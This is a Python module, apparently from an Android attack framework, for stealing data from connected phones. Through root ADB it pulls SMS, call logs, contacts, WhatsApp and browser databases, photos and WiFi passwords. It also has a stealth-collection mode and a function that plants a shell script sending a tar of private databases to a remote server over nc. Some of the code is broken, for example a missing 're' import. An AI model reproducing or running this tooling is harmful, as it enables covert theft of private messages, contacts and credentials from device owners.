#!/usr/bin/env python3
"""
Data Exfiltration Module for Androduct Framework
Extracts and exfiltrates sensitive data from Android devices
"""

import subprocess
import os
import json
import sqlite3
import zipfile
from datetime import datetime
from pathlib import Path
from core.adb.device_manager import DeviceManager
from core.utils.logger import logger
from config import Colors, LOGS_DIR, BACKUPS_DIR
from core.utils import session_manager

dm = DeviceManager()


def exfiltration_menu():
    """Main data exfiltration menu"""
    device = dm.get_current_device()
    if not device:
        logger.error("No device connected. Please connect a device first.")
        return

    while True:
        # show global menu header
        try:
            print(session_manager.get_menu_header())
        except Exception:
            pass
        print(f"""
{Colors.CYAN}Data Exfiltration Menu{Colors.END}
{Colors.CYAN}====================={Colors.END}
[1] SMS & Call Logs
[2] Contacts Database
[3] Browser Data (History, Bookmarks)
[4] WhatsApp Data
[5] Photos & Media Files
[6] Installed APKs
[7] WiFi Passwords
[8] Application Data
[9] System Configuration
[10] Full Device Backup
[11] Stealth Data Collection
[12] Remote Exfiltration Setup
[0] Back to Main Menu
        """)

        choice = input(f"{Colors.CYAN}exfil{Colors.END} > ").strip()

        try:
            if choice == "1":
                extract_sms_calls(device)
            elif choice == "2":
                extract_contacts(device)
            elif choice == "3":
                extract_browser_data(device)
            elif choice == "4":
                extract_whatsapp_data(device)
            elif choice == "5":
                extract_media_files(device)
            elif choice == "6":
                extract_installed_apks(device)
            elif choice == "7":
                extract_wifi_passwords(device)
            elif choice == "8":
                extract_app_data(device)
            elif choice == "9":
                extract_system_config(device)
            elif choice == "10":
                perform_full_backup(device)
            elif choice == "11":
                stealth_collection(device)
            elif choice == "12":
                setup_remote_exfiltration(device)
            elif choice == "0":
                break
            else:
                logger.warning("Invalid option selected")
        except Exception as e:
            logger.error(f"Operation failed: {str(e)}")


def execute_adb_command(device, command, shell=True, root=False):
    """Execute ADB command and return output"""
    try:
        if shell:
            if root:
                cmd = ["adb", "-s", device, "shell", "su", "-c"] + [command]
            else:
                cmd = ["adb", "-s", device, "shell"] + command.split()
        else:
            cmd = ["adb", "-s", device] + command.split()

        logger.log_command(" ".join(cmd), device)
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=60)

        if result.returncode == 0:
            return result.stdout.strip()
        else:
            logger.error(f"Command failed: {result.stderr.strip()}")
            return None
    except subprocess.TimeoutExpired:
        logger.error("Command timed out")
        return None
    except Exception as e:
        logger.error(f"Command execution failed: {str(e)}")
        return None


def check_root_access(device):
    """Check if device has root access"""
    result = execute_adb_command(device, "whoami", shell=True, root=True)
    return result == "root" if result else False


def create_backup_dir(device, data_type):
    """Create backup directory for specific data type"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_path = BACKUPS_DIR / f"{device}_{data_type}_{timestamp}"
    backup_path.mkdir(parents=True, exist_ok=True)
    return backup_path


def extract_sms_calls(device):
    """Extract SMS and call logs"""
    logger.info("Extracting SMS and call logs...")

    backup_dir = create_backup_dir(device, "sms_calls")

    # SMS database locations
    sms_paths = [
        "/data/data/com.android.providers.telephony/databases/mmssms.db",
        "/data/user/0/com.android.providers.telephony/databases/mmssms.db"
    ]

    # Call log database locations
    call_paths = [
        "/data/data/com.android.providers.contacts/databases/calllog.db",
        "/data/user/0/com.android.providers.contacts/databases/calllog.db"
    ]

    extracted_files = []

    try:
        # Extract SMS database
        for sms_path in sms_paths:
            if execute_adb_command(device, f"test -f {sms_path} && echo exists", shell=True, root=True) == "exists":
                local_file = backup_dir / "sms.db"
                subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {sms_path}"],
                               stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

                if local_file.exists() and local_file.stat().st_size > 0:
                    extracted_files.append(local_file)
                    logger.success(f"SMS database extracted: {local_file}")

                    # Parse SMS data
                    parse_sms_database(local_file, backup_dir)
                break

        # Extract call log database
        for call_path in call_paths:
            if execute_adb_command(device, f"test -f {call_path} && echo exists", shell=True, root=True) == "exists":
                local_file = backup_dir / "calllog.db"
                subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {call_path}"],
                               stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

                if local_file.exists() and local_file.stat().st_size > 0:
                    extracted_files.append(local_file)
                    logger.success(
                        f"Call log database extracted: {local_file}")

                    # Parse call log data
                    parse_call_database(local_file, backup_dir)
                break

        if extracted_files:
            logger.success(
                f"SMS/Call extraction completed. Files saved to: {backup_dir}")
        else:
            logger.warning("No SMS/Call databases found or extraction failed")

    except Exception as e:
        logger.error(f"SMS/Call extraction failed: {str(e)}")


def parse_sms_database(db_file, output_dir):
    """Parse SMS database and export to JSON"""
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        # Get SMS messages
        cursor.execute("""
            SELECT address, body, date, type, read 
            FROM sms 
            ORDER BY date DESC
        """)

        sms_data = []
        for row in cursor.fetchall():
            sms_data.append({
                "phone_number": row[0],
                "message": row[1],
                "timestamp": datetime.fromtimestamp(int(row[2])/1000).isoformat(),
                "type": "received" if row[3] == 1 else "sent",
                "read": bool(row[4])
            })

        # Export to JSON
        json_file = output_dir / "sms_messages.json"
        with open(json_file, 'w') as f:
            json.dump(sms_data, f, indent=2)

        logger.success(
            f"SMS data parsed: {len(sms_data)} messages saved to {json_file}")

        conn.close()

    except Exception as e:
        logger.error(f"Failed to parse SMS database: {str(e)}")


def parse_call_database(db_file, output_dir):
    """Parse call log database and export to JSON"""
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        # Get call logs
        cursor.execute("""
            SELECT number, duration, date, type, name 
            FROM calls 
            ORDER BY date DESC
        """)

        call_data = []
        call_types = {1: "incoming", 2: "outgoing", 3: "missed"}

        for row in cursor.fetchall():
            call_data.append({
                "phone_number": row[0],
                "duration": row[1],
                "timestamp": datetime.fromtimestamp(int(row[2])/1000).isoformat(),
                "type": call_types.get(row[3], "unknown"),
                "contact_name": row[4]
            })

        # Export to JSON
        json_file = output_dir / "call_logs.json"
        with open(json_file, 'w') as f:
            json.dump(call_data, f, indent=2)

        logger.success(
            f"Call log data parsed: {len(call_data)} calls saved to {json_file}")

        conn.close()

    except Exception as e:
        logger.error(f"Failed to parse call database: {str(e)}")


def extract_contacts(device):
    """Extract contacts database"""
    logger.info("Extracting contacts database...")

    backup_dir = create_backup_dir(device, "contacts")

    contacts_paths = [
        "/data/data/com.android.providers.contacts/databases/contacts2.db",
        "/data/user/0/com.android.providers.contacts/databases/contacts2.db"
    ]

    try:
        for contacts_path in contacts_paths:
            if execute_adb_command(device, f"test -f {contacts_path} && echo exists", shell=True, root=True) == "exists":
                local_file = backup_dir / "contacts.db"
                subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {contacts_path}"],
                               stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

                if local_file.exists() and local_file.stat().st_size > 0:
                    logger.success(
                        f"Contacts database extracted: {local_file}")
                    parse_contacts_database(local_file, backup_dir)
                    return

        logger.warning("No contacts database found")

    except Exception as e:
        logger.error(f"Contacts extraction failed: {str(e)}")


def parse_contacts_database(db_file, output_dir):
    """Parse contacts database and export to JSON"""
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        # Get contacts with phone numbers
        cursor.execute("""
            SELECT c.display_name, pd.data1, pd.data2
            FROM raw_contacts rc
            JOIN contacts c ON rc.contact_id = c._id
            JOIN data pd ON rc._id = pd.raw_contact_id
            WHERE pd.mimetype = 'vnd.android.cursor.item/phone_v2'
        """)

        contacts_data = []
        for row in cursor.fetchall():
            contacts_data.append({
                "name": row[0],
                "phone_number": row[1],
                "phone_type": row[2]
            })

        # Export to JSON
        json_file = output_dir / "contacts.json"
        with open(json_file, 'w') as f:
            json.dump(contacts_data, f, indent=2)

        logger.success(
            f"Contacts parsed: {len(contacts_data)} contacts saved to {json_file}")

        conn.close()

    except Exception as e:
        logger.error(f"Failed to parse contacts database: {str(e)}")


def extract_browser_data(device):
    """Extract browser history and bookmarks"""
    logger.info("Extracting browser data...")

    backup_dir = create_backup_dir(device, "browser")

    # Common browser database locations
    browser_paths = {
        "Chrome": "/data/data/com.android.chrome/app_chrome/Default/History",
        "Firefox": "/data/data/org.mozilla.firefox/files/mozilla/*.default/places.sqlite",
        "Samsung Browser": "/data/data/com.sec.android.app.sbrowser/databases/browser.db"
    }

    extracted_count = 0

    try:
        for browser_name, db_path in browser_paths.items():
            if "*" in db_path:
                # Handle wildcard paths
                base_path = db_path.split("*")[0]
                pattern = db_path.split("*")[1]

                # Find matching directories
                dirs = execute_adb_command(
                    device, f"find {base_path} -name '*default*' -type d", shell=True, root=True)
                if dirs:
                    for dir_path in dirs.split('\\n'):
                        full_path = f"{dir_path.strip()}{pattern}"
                        if execute_adb_command(device, f"test -f {full_path} && echo exists", shell=True, root=True) == "exists":
                            local_file = backup_dir / \
                                f"{browser_name.lower()}_history.db"
                            subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {full_path}"],
                                           stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

                            if local_file.exists() and local_file.stat().st_size > 0:
                                logger.success(
                                    f"{browser_name} history extracted: {local_file}")
                                extracted_count += 1
                            break
            else:
                if execute_adb_command(device, f"test -f {db_path} && echo exists", shell=True, root=True) == "exists":
                    local_file = backup_dir / \
                        f"{browser_name.lower()}_history.db"
                    subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {db_path}"],
                                   stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

                    if local_file.exists() and local_file.stat().st_size > 0:
                        logger.success(
                            f"{browser_name} history extracted: {local_file}")
                        extracted_count += 1

        if extracted_count > 0:
            logger.success(
                f"Browser data extraction completed. {extracted_count} databases extracted to: {backup_dir}")
        else:
            logger.warning("No browser databases found")

    except Exception as e:
        logger.error(f"Browser data extraction failed: {str(e)}")


def extract_whatsapp_data(device):
    """Extract WhatsApp databases and media"""
    logger.info("Extracting WhatsApp data...")

    backup_dir = create_backup_dir(device, "whatsapp")

    whatsapp_paths = {
        "messages": "/data/data/com.whatsapp/databases/msgstore.db",
        "contacts": "/data/data/com.whatsapp/databases/wa.db",
        "media": "/sdcard/WhatsApp/Media/"
    }

    try:
        # Extract databases
        for data_type, db_path in whatsapp_paths.items():
            if data_type == "media":
                continue  # Handle media separately

            if execute_adb_command(device, f"test -f {db_path} && echo exists", shell=True, root=True) == "exists":
                local_file = backup_dir / f"whatsapp_{data_type}.db"
                subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {db_path}"],
                               stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

                if local_file.exists() and local_file.stat().st_size > 0:
                    logger.success(
                        f"WhatsApp {data_type} extracted: {local_file}")

        # Extract media files (sample)
        media_dir = backup_dir / "media"
        media_dir.mkdir(exist_ok=True)

        # Get recent media files
        recent_media = execute_adb_command(
            device, "find /sdcard/WhatsApp/Media/ -name '*.jpg' -o -name '*.mp4' | head -10")
        if recent_media:
            for media_file in recent_media.split('\\n'):
                if media_file.strip():
                    filename = Path(media_file.strip()).name
                    local_media = media_dir / filename
                    try:
                        subprocess.run(["adb", "-s", device, "pull", media_file.strip(), str(local_media)],
                                       stderr=subprocess.DEVNULL, timeout=30)
                        if local_media.exists():
                            logger.success(f"Media file extracted: {filename}")
                    except:
                        pass

        logger.success(
            f"WhatsApp data extraction completed. Files saved to: {backup_dir}")

    except Exception as e:
        logger.error(f"WhatsApp extraction failed: {str(e)}")


def extract_media_files(device):
    """Extract photos and media files"""
    logger.info("Extracting media files...")

    backup_dir = create_backup_dir(device, "media")

    media_locations = [
        "/sdcard/DCIM/Camera/",
        "/sdcard/Pictures/",
        "/sdcard/Download/",
        "/sdcard/WhatsApp/Media/WhatsApp Images/"
    ]

    file_count = 0

    try:
        for location in media_locations:
            logger.info(f"Scanning: {location}")

            # Get recent files
            files = execute_adb_command(
                device, f"find {location} -type f \\( -name '*.jpg' -o -name '*.png' -o -name '*.mp4' \\) | head -20")
            if files:
                for file_path in files.split('\\n'):
                    if file_path.strip():
                        filename = Path(file_path.strip()).name
                        local_file = backup_dir / filename

                        try:
                            subprocess.run(["adb", "-s", device, "pull", file_path.strip(), str(local_file)],
                                           stderr=subprocess.DEVNULL, timeout=30)
                            if local_file.exists():
                                file_count += 1
                                if file_count <= 5:  # Show first 5 files
                                    logger.success(
                                        f"Media extracted: {filename}")
                        except:
                            pass

        logger.success(
            f"Media extraction completed. {file_count} files saved to: {backup_dir}")

    except Exception as e:
        logger.error(f"Media extraction failed: {str(e)}")


def extract_installed_apks(device):
    """Extract all installed APK files"""
    logger.info("Extracting installed APKs...")

    backup_dir = create_backup_dir(device, "apks")

    try:
        # Get list of all packages with their paths
        packages = execute_adb_command(device, "pm list packages -f")
        if not packages:
            logger.error("Failed to get package list")
            return

        apk_count = 0

        for line in packages.split('\\n'):
            if line.strip() and '=' in line:
                parts = line.split('=')
                apk_path = parts[0].replace('package:', '')
                package_name = parts[1]

                # Skip system apps for now (uncomment to include)
                # if '/system/' in apk_path:
                #     continue

                filename = f"{package_name}.apk"
                local_file = backup_dir / filename

                try:
                    subprocess.run(["adb", "-s", device, "pull", apk_path, str(local_file)],
                                   stderr=subprocess.DEVNULL, timeout=30)

                    if local_file.exists() and local_file.stat().st_size > 1000:  # Skip empty files
                        apk_count += 1
                        if apk_count <= 5:  # Show first 5 APKs
                            logger.success(f"APK extracted: {filename}")

                        if apk_count >= 50:  # Limit to 50 APKs
                            break
                except:
                    pass

        logger.success(
            f"APK extraction completed. {apk_count} APKs saved to: {backup_dir}")

    except Exception as e:
        logger.error(f"APK extraction failed: {str(e)}")


def extract_wifi_passwords(device):
    """Extract WiFi passwords (requires root)"""
    logger.info("Extracting WiFi passwords...")

    if not check_root_access(device):
        logger.error("Root access required for WiFi password extraction")
        return

    backup_dir = create_backup_dir(device, "wifi")

    wifi_config_paths = [
        "/data/misc/wifi/wpa_supplicant.conf",
        "/data/wifi/bcm_supp.conf",
        "/data/misc/wifi/WifiConfigStore.xml"
    ]

    try:
        extracted_files = []

        for config_path in wifi_config_paths:
            if execute_adb_command(device, f"test -f {config_path} && echo exists", shell=True, root=True) == "exists":
                filename = Path(config_path).name
                local_file = backup_dir / filename

                config_content = execute_adb_command(
                    device, f"cat {config_path}", shell=True, root=True)
                if config_content:
                    with open(local_file, 'w') as f:
                        f.write(config_content)

                    extracted_files.append(local_file)
                    logger.success(f"WiFi config extracted: {filename}")

        if extracted_files:
            # Parse WiFi passwords
            parse_wifi_configs(extracted_files, backup_dir)
            logger.success(
                f"WiFi extraction completed. Files saved to: {backup_dir}")
        else:
            logger.warning("No WiFi configuration files found")

    except Exception as e:
        logger.error(f"WiFi extraction failed: {str(e)}")


def parse_wifi_configs(config_files, output_dir):
    """Parse WiFi configuration files to extract passwords"""
    try:
        wifi_networks = []

        for config_file in config_files:
            with open(config_file, 'r') as f:
                content = f.read()

            if 'wpa_supplicant.conf' in config_file.name:
                # Parse wpa_supplicant.conf format
                networks = content.split('network={')
                for network in networks[1:]:
                    ssid_match = re.search(r'ssid="([^"]+)"', network)
                    psk_match = re.search(r'psk="([^"]+)"', network)

                    if ssid_match and psk_match:
                        wifi_networks.append({
                            "ssid": ssid_match.group(1),
                            "password": psk_match.group(1),
                            "source": config_file.name
                        })

        if wifi_networks:
            json_file = output_dir / "wifi_passwords.json"
            with open(json_file, 'w') as f:
                json.dump(wifi_networks, f, indent=2)

            logger.success(
                f"WiFi passwords parsed: {len(wifi_networks)} networks saved to {json_file}")

            # Display found networks
            print(f"{Colors.YELLOW}Found WiFi Networks:{Colors.END}")
            for network in wifi_networks:
                print(f"  SSID: {Colors.GREEN}{network['ssid']}{Colors.END}")
                print(
                    f"  Password: {Colors.CYAN}{network['password']}{Colors.END}")

    except Exception as e:
        logger.error(f"Failed to parse WiFi configs: {str(e)}")


def extract_app_data(device):
    """Extract application data directories"""
    logger.info("Extracting application data...")

    if not check_root_access(device):
        logger.error("Root access required for app data extraction")
        return

    # Get user apps
    packages = execute_adb_command(device, "pm list packages -3")
    if not packages:
        logger.error("Failed to get package list")
        return

    print(f"{Colors.YELLOW}Select app to extract data:{Colors.END}")
    app_list = []
    for i, line in enumerate(packages.split('\\n')[:10], 1):
        if line.strip():
            package_name = line.split('=')[-1].strip()
            app_list.append(package_name)
            print(f"  [{i}] {package_name}")

    try:
        choice = int(input("Select app (number): ")) - 1
        if 0 <= choice < len(app_list):
            selected_app = app_list[choice]

            backup_dir = create_backup_dir(device, f"app_data_{selected_app}")

            # Extract app data directory
            app_data_path = f"/data/data/{selected_app}/"

            logger.info(f"Extracting data for: {selected_app}")

            # Create tar archive of app data
            tar_file = "/data/local/tmp/app_data.tar"
            execute_adb_command(
                device, f"tar -cf {tar_file} -C /data/data {selected_app}", shell=True, root=True)

            # Pull tar file
            local_tar = backup_dir / "app_data.tar"
            subprocess.run(["adb", "-s", device, "pull",
                           tar_file, str(local_tar)])

            if local_tar.exists():
                # Extract tar file
                with zipfile.ZipFile(backup_dir / "app_data.zip", 'w') as zipf:
                    zipf.write(local_tar, "app_data.tar")

                logger.success(f"App data extracted: {backup_dir}")

                # Cleanup
                execute_adb_command(
                    device, f"rm {tar_file}", shell=True, root=True)
                local_tar.unlink()

        else:
            logger.error("Invalid selection")

    except (ValueError, IndexError):
        logger.error("Invalid selection")


def extract_system_config(device):
    """Extract system configuration files"""
    logger.info("Extracting system configuration...")

    backup_dir = create_backup_dir(device, "system_config")

    config_files = [
        "/system/build.prop",
        "/proc/version",
        "/proc/cpuinfo",
        "/proc/meminfo",
        "/system/etc/hosts"
    ]

    try:
        for config_file in config_files:
            filename = Path(config_file).name
            local_file = backup_dir / filename

            content = execute_adb_command(
                device, f"cat {config_file}", shell=True)
            if content:
                with open(local_file, 'w') as f:
                    f.write(content)

                logger.success(f"Config extracted: {filename}")

        logger.success(
            f"System config extraction completed. Files saved to: {backup_dir}")

    except Exception as e:
        logger.error(f"System config extraction failed: {str(e)}")


def perform_full_backup(device):
    """Perform comprehensive device backup"""
    logger.info("Performing full device backup...")

    backup_dir = create_backup_dir(device, "full_backup")

    print(f"{Colors.YELLOW}Starting comprehensive backup...{Colors.END}")

    # Run all extraction functions
    try:
        extract_sms_calls(device)
        extract_contacts(device)
        extract_browser_data(device)
        extract_media_files(device)
        extract_system_config(device)

        if check_root_access(device):
            extract_wifi_passwords(device)
            logger.info("Root-only extractions completed")

        logger.success(
            f"Full backup completed. All data saved to: {BACKUPS_DIR}")

    except Exception as e:
        logger.error(f"Full backup failed: {str(e)}")


def stealth_collection(device):
    """Perform stealth data collection"""
    logger.info("Starting stealth data collection...")

    # Minimize logging and output during stealth mode
    backup_dir = create_backup_dir(device, "stealth")

    # Collect only essential data quietly
    try:
        # Quick SMS extraction
        sms_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        if execute_adb_command(device, f"test -f {sms_path} && echo exists", shell=True, root=True) == "exists":
            local_file = backup_dir / "data.db"
            subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {sms_path}"],
                           stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

        # Quick contact extraction
        contacts_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        if execute_adb_command(device, f"test -f {contacts_path} && echo exists", shell=True, root=True) == "exists":
            local_file = backup_dir / "contacts.db"
            subprocess.run(["adb", "-s", device, "exec-out", "su", "-c", f"cat {contacts_path}"],
                           stdout=open(local_file, 'wb'), stderr=subprocess.DEVNULL)

        print(f"{Colors.GREEN}Stealth collection completed silently{Colors.END}")

    except Exception as e:
        logger.error(f"Stealth collection failed: {str(e)}")


def setup_remote_exfiltration(device):
    """Setup remote data exfiltration"""
    logger.info("Setting up remote exfiltration...")

    # Get remote server details
    server_ip = input("Enter remote server IP: ").strip()
    server_port = input("Enter remote server port: ").strip()

    if not server_ip or not server_port:
        logger.error("Server IP and port required")
        return

    # Create exfiltration script
    exfil_script = f"""#!/system/bin/sh
# Remote exfiltration script

# Compress sensitive data
tar -czf /data/local/tmp/exfil_data.tar.gz \\
    /data/data/com.android.providers.telephony/databases/mmssms.db \\
    /data/data/com.android.providers.contacts/databases/contacts2.db \\
    /sdcard/DCIM/Camera/*.jpg 2>/dev/null

# Upload to remote server
nc {server_ip} {server_port} < /data/local/tmp/exfil_data.tar.gz

# Cleanup
rm /data/local/tmp/exfil_data.tar.gz
"""

    try:
        # Write script to device
        script_path = "/data/local/tmp/exfil.sh"

        with open("temp_exfil.sh", "w") as f:
            f.write(exfil_script)

        subprocess.run(["adb", "-s", device, "push",
                       "temp_exfil.sh", script_path])
        execute_adb_command(device, f"chmod +x {script_path}")

        # Clean up local temp file
        os.unlink("temp_exfil.sh")

        logger.success(f"Remote exfiltration script installed: {script_path}")
        logger.info(
            f"Start listener: nc -l -p {server_port} > received_data.tar.gz")

        # Option to run immediately
        if input("Execute exfiltration now? (y/N): ").lower() == 'y':
            execute_adb_command(device, script_path, shell=True, root=True)
            logger.info("Exfiltration script executed")

    except Exception as e:
        logger.error(f"Remote exfiltration setup failed: {str(e)}")


if __name__ == "__main__":
    exfiltration_menu()
